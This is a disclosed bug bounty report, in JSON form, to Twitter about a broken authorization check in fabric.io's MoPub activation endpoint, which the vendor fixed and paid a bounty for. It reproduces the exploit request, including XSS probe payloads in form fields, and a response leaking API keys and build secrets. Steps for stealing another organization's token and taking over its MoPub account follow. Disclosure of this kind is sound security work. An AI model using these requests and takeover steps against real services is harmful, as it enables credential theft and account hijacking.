{"id":95552,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTU1Mg==","url":"https://hackerone.com/reports/95552","title":"IDOR- Activate Mopub on different organizations- steal api token- Fabric.io","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-10-24T07:40:42.855Z","submitted_at":"2015-10-24T07:40:42.855Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"akhil-reni","url":"/akhil-reni","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-01-25T19:20:01.911Z","bug_reporter_agreed_on_going_public_at":"2016-01-21T16:58:31.012Z","team_member_agreed_on_going_public_at":"2016-01-25T19:19:57.835Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Hello,**\n\nThere is an option to enroll your organization in fabric.io for mopub , but this particular end point is missing proper authorization checks allowing any user to steal API tokens.\n\nVulnerable request\n================\n```\nPOST /api/v3/organizations/5460d2394b793294df01104a/mopub/activate HTTP/1.1\nHost: fabric.io\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: 0jGxOZOgvkmucYubALnlQyoIlsSUBJ1VQxjw0qjp73A=\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CRASHLYTICS-DEVELOPER-TOKEN: 0bb5ea45eb53fa71fa5758290be5a7d5bb867e77\nX-Requested-With: XMLHttpRequest\nReferer: https://fabric.io/img-srcx-onerrorprompt15/android/apps/app.myapplication/mopub\nContent-Length: 235\nCookie: \u003credacted\u003e\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ncompany_name=dragoncompany\u0026address1=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E\u0026address2=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E\u0026city=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E\u0026state=asdas\u0026zip_code=50094\u0026country_code=IN\u0026link=false\n```\n\nResponse\n==================\n```\n{\"mopub_identity\":{\"id\":\"5496c76e8b15dabe9c0006d7\",\"confirmed\":true,\"primary\":false,\"service\":\"mopub\",\"token\":\"35592\"},\"organization\":{\"id\":\"5460d2394b793294df01104a\",\"name\":\"\\u003Ca href=\\\"javascript:alert(1);\\\"\\u003Es\\u003C/a\\u003E\\u003Ch1\\u003Etest\\u003C/h1\\u003E\",\"alias\":\"img-srcx-onerrorprompt1s-projects2\",\"api_key\":\"8590313c7382375063c2fe279a4487a98387767a\",\"enrollments\":{\"beta_distribution\":\"true\"},\"accounts_count\":3,\"apps_counts\":{\"android\":2},\"sdk_organization\":true,\"build_secret\":\"5ef0323f62d71c475611a635ea09a3132f037557d801503573b643ef8ad82054\",\"mopub_id\":\"33525\"}}\n```\n\nSteps to reproduce\n==================\n- create two accounts\n- note down organization id's from both the accounts\n- repeat the above request with organization id of B from account A\n- you will be able to steal victims mopub API key\n\nPOC screenshot attached.\n\n**Regards\nWeSecureApp**","bounty_amount":"5040.0","formatted_bounty":"$5,040","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":58589,"file_name":"issue5.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/058/589/17a94709f9fd4f43a4d99b3dc6d11b2b7e9cd459/issue5.png?response-content-disposition=attachment%3B%20filename%3D%22issue5.png%22%3B%20filename%2A%3DUTF-8%27%27issue5.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154511Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e2b9bbe7a767293c11aaa27940414d004439e79e5373e58df7235b113204bd9c","file_size":150380,"type":"image/png"}],"allow_singular_disclosure_at":"2016-02-20T16:58:34.899Z","allow_singular_disclosure_after":-177979596.2645633,"singular_disclosure_allowed":true,"vote_count":11,"voters":["michiel","mak","realtess","eveeez","domssilva","911","safisec","eyad_hamza","wargsec","rashedul_css","and 1 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":633553,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The organization id can be retrieved in the same manner as described in #93759 , #93758, #95548, #95547","automated_response":false,"created_at":"2015-10-27T06:34:26.094Z","updated_at":"2015-10-27T06:34:26.094Z","actor":{"username":"akhil-reni","cleared":false,"url":"/akhil-reni","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":634359,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2015-10-27T18:23:38.630Z","updated_at":"2015-10-27T18:23:38.630Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637214,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2015-10-29T17:41:08.494Z","updated_at":"2015-10-29T17:41:08.494Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"akhil-reni","url":"/akhil-reni"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":639720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hello,\n\ndoes this qualify under twitter bug bounty scope? ","automated_response":false,"created_at":"2015-10-31T05:51:52.201Z","updated_at":"2015-10-31T05:51:52.201Z","actor":{"username":"akhil-reni","cleared":false,"url":"/akhil-reni","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":648485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@wesecureapp we are determining impact and will process a payout within a reasonable time frame.","automated_response":false,"created_at":"2015-11-06T19:17:25.494Z","updated_at":"2015-11-06T19:17:25.494Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":653675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@apinter thank you, just to let you know that after getting the API token one could takeover victims mopub account.\nand this can be done remotely.","automated_response":false,"created_at":"2015-11-11T09:01:50.792Z","updated_at":"2015-11-11T09:01:50.792Z","actor":{"username":"akhil-reni","cleared":false,"url":"/akhil-reni","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":656042,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@wesecureapp can you please provide a detailed impact statement and repro steps for how the takeover occurs and what access levels the attacker has afterwards?","automated_response":false,"created_at":"2015-11-12T23:21:39.693Z","updated_at":"2015-11-12T23:21:39.693Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":656240,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @apinter,\n\n- Use the above method to steal the build secret from the victim using fabric.io\n- use the below URL to get access into victims mopub account.\n``https://app.mopub.com/complete/htsdk/?code=[build secret]\u0026amp;next=%2d``\n replace [build secret] with token you extracted from step one\n- Now you will have access to victims mopub's account with all his apps/organizations from fabric as shown in the screenshot","automated_response":false,"created_at":"2015-11-13T05:10:18.387Z","updated_at":"2015-11-13T05:10:18.387Z","actor":{"username":"akhil-reni","cleared":false,"url":"/akhil-reni","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":61368,"filename":"fabric.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/061/368/5046cb1a12d3651686f13282ff970803b6721a36/fabric.png?response-content-disposition=attachment%3B%20filename%3D%22fabric.png%22%3B%20filename%2A%3DUTF-8%27%27fabric.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154511Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=803bea7ba69a3dcd1a98b84dea08b3705061bc5863fbdf54d8bea39d8ddc4887"}],"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":657071,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","automated_response":false,"created_at":"2015-11-13T19:30:55.816Z","updated_at":"2015-11-13T19:30:55.816Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"5040.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"akhil-reni","url":"/akhil-reni"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":766960,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we publicly disclose this bug?\nhttp://blog.wesecureapp.com/taking-over-mopub-accounts-with-little-help-from-fabric/","automated_response":false,"created_at":"2016-01-21T16:58:31.041Z","updated_at":"2016-01-21T16:58:31.041Z","first_to_agree":true,"actor":{"username":"akhil-reni","cleared":false,"url":"/akhil-reni","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771360,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-01-25T19:19:57.871Z","updated_at":"2016-01-25T19:19:57.871Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":771361,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-01-25T19:20:01.946Z","updated_at":"2016-01-25T19:20:01.946Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}